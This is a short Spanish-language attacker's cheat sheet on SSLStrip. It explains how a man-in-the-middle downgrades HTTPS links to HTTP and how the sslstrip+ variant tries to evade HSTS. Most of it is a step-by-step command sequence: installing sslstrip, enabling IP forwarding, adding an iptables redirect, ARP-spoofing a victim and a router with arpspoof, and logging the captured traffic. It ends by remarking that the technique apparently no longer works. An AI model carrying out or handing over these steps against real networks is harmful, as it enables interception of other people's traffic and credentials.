SSL Strip
http://www.thoughtcrime.org/software/sslstrip/

Se trata de modificar todas las webs que recibe la victima (si somos MiTM) para cambiar los links https por http
Parece que esto dejó de funcionar con la introducción de HSTS en 2010. Con esta política de seguridad los servidores web obligan a los navegadores a conectarse obligatoriamente via https.

Como contraataque se usa ssltrip+ (o ssltrip2), que a parte de quitar el https, modifica ligeramente el dominio (wwww en vez de www, por ejemplo).
Este dominio no es válido, pero como somos MiTM lo resolveremos nosotros correctamente.


Hack de HTTPS con macspoof

https://github.com/moxie0/sslstrip
http://www.thoughtcrime.org/software/sslstrip/

sudo apt-get install python-twisted-web
git clone https://github.com/moxie0/sslstrip.git
cd sslstrip
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
apt-get install dsniff

Hacemos arpspoof para que todo el tráfico pase por mi pc
arpspoof -i eth0 -t ip.de.la.victima ip.del.router
arpspoof -i eth0 -t ip.del.router ip.de.la.victima

python sslstrip.py -a -w capture.log -l 8080

Parece que ya no funciona
